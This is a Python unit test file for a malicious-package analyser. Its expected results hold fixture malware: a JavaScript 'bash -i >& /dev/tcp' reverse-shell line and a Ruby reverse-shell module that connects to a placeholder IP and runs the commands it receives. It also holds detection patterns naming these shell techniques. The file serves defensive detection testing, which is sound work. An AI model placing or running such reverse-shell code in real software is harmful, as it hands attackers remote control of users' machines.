import os
from unittest import TestCase

from malicious_code_analyser import MaliciousCodeAnalyser, MaliciousCodeAnalyseResult
from malicious_code_detector import MaliciousPattern


class TestMaliciousCodeAnalyser(TestCase):

    def test_analyse_js(self):
        mca = MaliciousCodeAnalyser()
        test_dir = os.getcwd()
        actual = mca.analyze(f"{test_dir}/resources/test-js-malicious-package.tgz", ".js")
        expect = [
            MaliciousCodeAnalyseResult(
                full_code='\nconst { exec } = require(\'child_process\')\n\n// dummy\nconsole.log("dummy");\n\n// Reverse TCP test\nconst stdout = execSync(\'bash -i >& /dev/tcp/localhost/1234 0>&1\');\n',
                malicious_code_line="const stdout = execSync('bash -i >& /dev/tcp/localhost/1234 0>&1');",
                code_line=7,
                malicious_pattern=(
                    "const stdout = execSync('bash -i >& /dev/tcp/localhost/1234 0>&1');",
                    MaliciousPattern(
                        pattern='bash -i',
                        example='bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
                    )
                )
            )
        ]
        self.assertEqual(
            actual,
            expect
        )

    def test_analyse_ruby(self):
        mca = MaliciousCodeAnalyser()
        test_dir = os.getcwd()
        actual = mca.analyze(f"{test_dir}/resources/test-malicious.gem", ".rb")
        # expect = MaliciousCodeAnalyseResult(
        full_code = """
require 'socket'
require 'open3'

#Set the Remote Host IP
RHOST = "192.168.0.1"
#Set the Remote Host Port
PORT = "1234"

module MaliciousTest
  class Malicious
    def reverse_shell_test
      begin
      sock = TCPSocket.new "#{RHOST}", "#{PORT}"
      sock.puts "conn"
      rescue
        sleep 20
        retry
      end

      begin
        while line = sock.gets
          Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
                    IO.copy_stream(stdout_and_stderr, sock)
                    end
        end
      rescue
        retry
      end
end
"""
        malicious_code_line = "          Open3.popen2e(\"#{line}\") do | stdin, stdout_and_stderr |"

        expect = [
            MaliciousCodeAnalyseResult(
                full_code=full_code,
                malicious_code_line=malicious_code_line,
                code_line=22,
                malicious_pattern=(
                    "          Open3.popen2e(\"#{line}\") do | stdin, stdout_and_stderr |",
                    MaliciousPattern(
                        pattern='popen2e',
                        example='socket = TCPSocket.new "#{RHOST}", "#{PORT}"  ... while line = sock.gets ... Open3.popen2e("#{line}") do | stdin, stdout_and_stderr ... '
                    )
                )
            )
        ]
        self.assertEqual(actual, expect)

